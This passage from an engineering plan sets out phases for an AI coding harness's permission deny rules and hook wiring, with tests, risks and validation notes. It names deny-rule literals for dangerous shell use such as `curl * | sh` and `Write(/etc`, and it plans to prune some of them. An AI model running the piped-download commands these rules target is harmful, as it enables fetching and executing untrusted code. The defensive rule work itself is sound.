  green; a **pristine** render (no pre-existing `settings.json`) emits exactly the 4 matchable
  rules; `/hm:health` `deny_covers_dangerous` passes in **both** opted-in and opted-out states.
  **Why not the live no-warning check here:** `_merge_permissions` unions the disk list, so any
  project that already carries the dead literals — including this repo, Phase 6's proof case —
  keeps them until Phase 6's prune lands. A no-warning criterion in Phase 5 would be unreachable
  on exactly the machine it would be tested on.
- **Risk:** medium — template + readiness must move together.
- **Rollback:** revert the Phase 5 commit.

### Phase 6 — Prune harness-shipped literals (ADR-004)
- **depends_on:** `[5]`
- **parallel_group:** `serial-hooks`
- **merge_hazards:** `_merge_permissions` (Phase 1 touches its caller).
- **Scope in:** `render.py` — an append-only module-level `_HARNESS_SHIPPED_DENY_LITERALS`
  frozenset (the 9 literals of ADR-004), dropped by exact full-string match during the union,
  before the template's own list is applied.
- **Scope out:** any heuristic/substring pruning — exact match only.
- **Exit criterion:** a unit test renders over a fixture `settings.json` holding all 9 harness
  literals + a user-added `Bash(foo:*)`, asserting the 9 are gone, the policy-derived list is
  rebuilt from `deny_dangerous`, and `Bash(foo:*)` survives; **the proof case** — re-rendering
  *this repo* (`deny_dangerous` unset ⇒ false) leaves `permissions.deny == []`, so its
  `Bash(curl:*)` is gone and the gate and settings finally agree; **and the live check moved
  from Phase 5** — a session with `deny_dangerous: true` on a project that previously carried
  the dead literals starts with **no** permission warning.
- **Risk:** low — narrow, exact-match, verifiable.
- **Rollback:** revert the Phase 6 commit.

### Phase 7 — Delete inert agent permissions + correct docs
- **depends_on:** `[]`
- **parallel_group:** `docs-cleanup`
- **merge_hazards:** `tests/e2e/sandbox-plugin-test/.claude/agents/**` — shared with Phase 4.
  Resolved by ordering: **Phase 4 depends_on includes 7**, so the fixtures regenerate once.
- **Scope in:** remove `permissions:` frontmatter from all agent templates + the prose copies
  in `executor_body.md.j2:14-21` / `autoloop-coder_body.md.j2:15-18`; rebaseline
  `test_agent_body_partials._EXPECTED_SHA256`; correct CLAUDE.md:193,
  TECH_SPEC.md:291-292/548/1209, docs/ARCHITECTURE.md:288,
  docs/HOW-IT-WORKS.md:1482-1484/1554/2327, docs/HOW-IT-WORKS.ko.md:1390-1392/1462/2208,
  docs/CONTRIBUTING.md:110, `templates/cursor/rules/harness.mdc.j2:64`, PRIVACY.md:184,
  docs/HOW-IT-WORKS.md:1723; document ADR-007's consumer-scoped gate in CLAUDE.md §보안/권한.
  *(CLAUDE.md:68's hooks claim was already corrected in Phase 1.)*
- **Scope out:** `tools:` changes (ADR-002 rejected); fixture regeneration (Phase 4).
- **Exit criterion:** `uv run pytest -q` green; `grep -rn "Write(/etc\|curl \* | sh"
  --include=*.j2 --include=*.md . | grep -v work-docs/` returns only CHANGELOG history.
- **Risk:** low — inert text; no runtime effect.
- **Rollback:** revert the Phase 7 commit.

### Phase 8 — Deny-syntax regression tests (shared constant)
- **depends_on:** `[5, 6]`
- **parallel_group:** `serial-hooks`
- **merge_hazards:** `tests/unit/test_permissions_deny_optout.py` (Phases 5 + 9).
- **Scope in:** a shared validator (`_is_matchable_rule`) consumed by template tests +
  `readiness`; assert no `Write(<path>)`/`NotebookEdit(<path>)`/`Glob(<path>)` and no `|`
  inside any `Bash(...)` in any rendered rule; fix `test_permissions_deny_optout.py:36`, which
  currently pins `Bash(curl * | sh)`.
- **Scope out:** agent frontmatter (deleted in Phase 7).
- **Exit criterion:** the new test FAILS against `d895800b`'s templates (proving it would have
  caught this) and passes after Phase 5.
- **Risk:** low.
- **Rollback:** revert the Phase 8 commit.

### Phase 9 — Consumption canary + de-pin the polluted tests (ADR-009)
- **depends_on:** `[1, 4]` — the canary reads the **sandbox fixture's** `settings.json`, which
  Phase 4 regenerates. At `[1]` alone the fixture still carries the old hooks layout, so the
  canary would fail for a reason unrelated to Phase 1 and invite being weakened.
- **parallel_group:** `serial-hooks`
- **merge_hazards:** `tests/integration/test_boundary_hooks_json.py` (Phase 4);
  `tests/unit/test_permissions_deny_optout.py` (Phases 5 + 8).
- **Scope in:** a new `INTEGRATION=1`-gated canary in `tests/e2e/` — run the real `claude`
  binary against `tests/e2e/sandbox-plugin-test/` with **a prompt and permission posture that
  deterministically force at least one tool call** (explicit `--allowedTools` /
  `--permission-mode` and a prompt like "read FILE and print its first line"); a headless run
  that invokes no tool emits no `PostToolUse` and would fail on both commits. Assert a **new**
  `post_tool_use` entry via `_metrics_io`'s reader (date-sharded path) against a recorded
  count/timestamp baseline — the shared helper exists precisely so emitters and tests cannot
  diverge on the location (`telemetry.py:277-280`). Also remove the location assertion from
  `test_boundary_hooks_json` that pins `.claude/hooks/hooks.json` as correct, and add a comment
  on `_boundary_helpers.py`'s parsers naming the circular-oracle limitation.
- **Scope out:** full Layer 3 (multi-stage canaries, LLM judge, weekly CI job); Layer 2 lints.
- **Exit criterion:** on a machine **with** the `claude` binary: render `d895800b`'s templates
  into a scratch copy of the fixture and confirm the canary **FAILS** there, then confirm it
  **PASSES** against the Phase-4 fixture. **A SKIP does not discharge this criterion.**
- **Risk:** medium — depends on the live binary; must not flake into a false green.
- **Rollback:** revert the Phase 9 commit; test-only.

## 🧪 Testing Strategy

**Unit** — settings render (both presets × `deny_dangerous` × hook stages);
`_merge_permissions` prune + user-rule preservation; `_merge_hooks_json` identity
(all-commands) + `_strip_shipped_commands`, for **both** nested and flat schemas;
`permission_gate.evaluate` × `deny_dangerous` × consumer path (flag present vs absent), incl.
missing/corrupt `harness.yaml` ⇒ fail-closed-to-today; `readiness` all four hook signals, each
with an explicit absent-case test.

**Integration** — `INTEGRATION=1 tests/integration/test_boundary_*.py`. Mandatory, not
advisory: this PLAN changes rendered-artifact contracts — the exact trigger from
`[fail:test] integration-gated-test-stale-after-behavior-flip`.

**Snapshot/e2e** — regenerate `tests/e2e/sandbox-plugin-test/**` **once**, in Phase 4 (whose
`depends_on` includes 7 for this reason). The 8 `tests/snapshot/*.expected.yaml` regenerate per
phase that changes the settings render; each diff must be exactly one `settings.json
body_sha256` — any other line is scope leak.

**Manual (load-bearing — no unit test substitutes)**
1. **Phase 2:** `/hm:loop` reaches iteration 2 in a NEW session; `$HM_SESSION_ID` non-empty.
2. **Phase 3:** Claude blocked/unblocked per `deny_dangerous`; Codex still denies on BOTH its
   paths; normal worktree `Write` not blocked.
3. **Phase 5/6:** `deny_dangerous: true` session → no startup warning (Phase 6).
4. **Cursor:** `.cursor/hooks.json` still fires (Phase 4 must not touch it).

## ⚠️ Risks & Mitigation

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| Ten never-run hooks fire latent bugs at once | medium | high | ADR-006 staging; each stage independently revertible. |
| `worktree_gate` false-positives block ordinary edits | medium | high | Phase 3 negative control is an explicit exit criterion. |
| ADR-004's wider prune removes protection a user believed was theirs | medium | medium | Interviewed and accepted (#10); the alternative silently ships rejected Approach A. |
| Consumer-scoped gate (ADR-007) drifts out of sync with a future IDE | medium | medium | Unit tests per consumer path; CLAUDE.md documents the split; module docstring corrected in the same commit. |
| Phases 1-3 leave `/hm:health` **actively misleading**, not merely stale | high | medium | Known; Phase 4 owns it. Recorded here because the original PLAN did not flag the intermediate-state window (code-reviewer, REVIEW round 1). |
| ADR-010 leaves plugin-less (PyPI) users without drift detection | confirmed | low | Accepted with evidence stated in ADR-010. |
| The canary passes on both commits → false green | medium | high | Phase 9 requires a demonstrated FAIL on `d895800b`; a SKIP does not discharge. |
| One canary mistaken for Layer 3 coverage | medium | medium | ADR-009 states the limit: only telemetry is observed. |
| The loop-marker analysis rests on a false premise | medium | medium | Not fixed here. Re-read CLAUDE.md §Loop-marker after Phase 2 — `HM_SESSION_ID` now populates, so the WSL2 env-file root cause is testable. |
| Wiring hooks ships unannounced blocking to Claude opt-out users | — | — | **Eliminated** by ADR-007 landing atomically in Phase 3. |
| Global subordination disables live Cursor/Codex protection | — | — | **Eliminated** by ADR-007's producer-side flag. |
| Retire rule deletes user-authored hooks | — | — | **Eliminated** by ADR-008 rev2 — no delete path ships. |
| **Deliverables destroyed at `task-land`** | — | — | **Eliminated 2026-07-17** — `.gitignore` now negates `work-docs/PLAN-*` etc. Cost this PLAN's original once. |

## ✅ Success Criteria

> **Status (2026-07-17): Phase 1 landed; Phases 2-9 pending.** Only the boxes Phase 1
> satisfies are checked. Two are checked on the strength of the 2026-07-17 controlled
> experiment rather than the shipped renderer — marked inline.
>
> **Deliberate deviation from the wrapup stage's Step 4 + Quality Bar**, recorded because a
> silent deviation is worse than the deviation. Step 4 says set `status: complete` and check
> *every* box, on the premise that at wrapup time all phases are done or explicitly deferred.
> That premise does not hold for a multi-phase PLAN landed one phase at a time: 8 of 9 are
> pending, not deferred. Following it literally would machine-assert unrun criteria.

- [ ] `.claude/settings.json` carries the 10 hooks of ADR-006; `sessionstart_drift` is not among them; `.claude/hooks/hooks.json` is not rendered. — **Phase 1 ships 5 of 10**; retirement is Phase 4.
- [x] The **date-sharded** `metrics-YYYY-MM-DD.jsonl` (read via `_metrics_io`, never the legacy `metrics.jsonl`) gains a `post_tool_use` entry newer than the pre-Phase-1 baseline, in a session where `CLAUDECODE=1`. — *proved by the 2026-07-17 experiment, not yet by the shipped renderer (needs a release).*
- [x] `HM_SESSION_ID` is non-empty in a fresh session. — *same caveat.*
- [ ] A `deny_dangerous: true` session starts with **zero** permission warnings. — Phase 6.
- [ ] Every rendered deny rule is matchable (Phase 8's validator).
- [ ] Re-rendering this repo yields `permissions.deny == []` — `Bash(curl:*)` gone — so the gate and settings agree on the proof case. — Phase 6.
- [ ] `deny_dangerous: false` blocks nothing new in **Claude** — and blocks strictly *less*: the pruned live `Bash(curl:*)` is intentionally **not** restored (ADR-004). Cursor and Codex block exactly as much as today (ADR-007); `test_codex_phase5` passes unmodified. — Phases 3+6.
- [x] User-authored `settings.json` hooks and deny rules survive re-render (ADR-008). — the "a retired harness hook does not" half is **withdrawn**: retirement is deferred out of Phase 1. Re-add with positive provenance in Phase 3.
- [ ] A rendered `settings.json` missing the SessionStart hook **FAILS** `sessionid_envfile_registered`, and one missing `autopilot_autoarm` **FAILS** `autopilot_autoarm_registered` — proving neither detector fails open. — Phase 4.
- [ ] A user-edited `.claude/hooks/hooks.json` is preserved with a warning; a pristine one is deleted (ADR-005). — Phase 4.
- [ ] No `Write(<path>)` deny or `curl * | sh` remains outside CHANGELOG history. — Phases 5+7.
- [ ] A canary FAILS on `d895800b` and PASSES after Phase 4 — proving the suite can see "artifact rendered but never consumed". — Phase 9.
- [ ] **Observation (not a gate):** after Phase 2, re-read CLAUDE.md §Loop-marker session-scoping against live `HM_SESSION_ID` behavior and record whether the WSL2 env-file root cause survives.

## 🔍 Plan Validation

**Round 1 — cross-model second opinion.** `codex`: 5 findings (1×P0, 3×P1, 1×P2), all
independently verified against real code before injection, all KEPT by the validator.
`antigravity`: **failed** — `agy --print --sandbox < file` ignored the stdin redirect and
answered the `--sandbox` flag itself; the fail-closed adapter found 0 JSON payloads. Ledger
row written.

**Round 1 — `plan-validator`: MAJOR_REVISION.** Kept all 5 codex findings + 9 of its own (3
critical). All 14 addressed: 4 via interview rounds 9-12 (ADR-004/005/007/010), 10 by direct
revision.

**Round 2 — `plan-validator` re-run (the only re-run stage policy allows): MAJOR_REVISION.**
Confirmed 10 of 14 resolved; found **3 new criticals, two introduced *by the revisions
themselves***:

| Finding | Resolution |
|---|---|
| **ADR-007 unimplementable** — Claude and Codex both send `hook_event_name: "PreToolUse"`; the "consumer" field the ADR cited does not exist | Fixed — producer-side `--subordinate-to-deny-dangerous` flag rendered only by the Claude template. Found independently by the main loop and the validator. |
| **`metrics.jsonl` is the pre-0.7.1 `_LEGACY_NAME`**; telemetry writes `metrics-YYYY-MM-DD.jsonl`. Phase 1's premise check, Phase 9's canary, and Success Criteria all watched a file nothing writes → guaranteed false negative | Fixed — all retargeted to `_metrics_io`'s reader. **And it falsified RESEARCH's evidence**: the date-sharded files hold **7,550** entries, not 2. |
| **Phase 5's exit criterion depends on Phase 6's prune** — unreachable on the very repo Phase 6 names as its proof case | Fixed — Phase 5 gets a render-level criterion; the live no-warning check moved to Phase 6. |
| ADR-008 sidecar unnamespaced — Claude↔Codex identity collision | Fixed (then the whole mechanism was replaced at execute time, and the retire rule removed at REVIEW). |
| ADR-010 rejected the in-hook guard for "a case with no evidence" — the repo's own release docs prove PyPI installs exist | Fixed — gap accepted with the evidence stated. |
| ADR-004's Consequences understate the `deny_dangerous: true` delta | Fixed — stated plainly in ADR-004 and Success Criteria. |

**Premise correction (the most important outcome).** RESEARCH's central empirical claim —
"`metrics.jsonl` holds 2 Cursor-origin entries; zero Claude-origin in months" — **read the
wrong file**. The date-sharded files hold 7,550 entries (5,294 with a `conversation_id` ⇒
Cursor; 2,256 without ⇒ unattributed, plausibly Codex). The premise nonetheless **holds**, on
the 2026-07-17 controlled experiment. Right conclusion, wrong evidence.

**Validator budget exhausted** (2 of 2). The Round-2 fixes are **not themselves
re-validated** — the standing risk on this PLAN. The validator's closing observation is the
one to carry forward: *pass 1 caught reasoning gaps; the revisions fixed those but introduced
citation errors — precise-and-wrong is more dangerous than vague, because it defeats review by
looking verified.*

**Phase 1 REVIEW (`REVIEW-permission-deny-and-hooks-wiring-2026-07-17.md`, also destroyed):**
Grade A / APPROVED after 3 rounds, `human_review_needed: true`. One consensus-passed P1 fixed
(mixed-group duplication). Four manual-only P1s adjudicated: retire-deletes-user-hooks and the
unanchored-regex promotion were **introduced by Phase 1 → fixed by removing the retire rule**;
`readiness` reading the dead file and `sessionstart_drift` on PyPI are **pre-existing → out of
scope**. Three harness defects filed as follow-ups (below).

## 🚧 Follow-ups filed (outside this PLAN)

1. **`codex` second opinion is dead on the feature-branch path** — the recipe resolves
   `.claude/schemas/…` relative to cwd; `.claude/` does not exist in a task worktree. Every
   `/hm:review` + `/hm:plan` run from a task worktree silently loses the codex voter. Worked
   around here with the base repo's absolute path; **had I not, this review would have lost the
   vote that produced its only consensus.**
2. **`antigravity` never reads its prompt** — `agy --print --sandbox … < file` ignores stdin
   (2/2 this session). Production mandates it on every review.
3. **Consensus filter cannot bridge severity tiers** — two voters agreeing on a defect at
   different severities produce two `manual-only` findings and zero consensus. Observed live.
4. **wrapup destroys deliverables when `work-docs/` is gitignored** — Step 6's
   `git add … || true` swallows the failure, Step 7's commit omits them, Step 7.7's
   `task-land` deletes the worktree holding the only copy. Cost this PLAN's original. The
   repo-side `.gitignore` is fixed; the **stage** still has no guard (it should verify the
   deliverable is actually staged, or refuse to land).
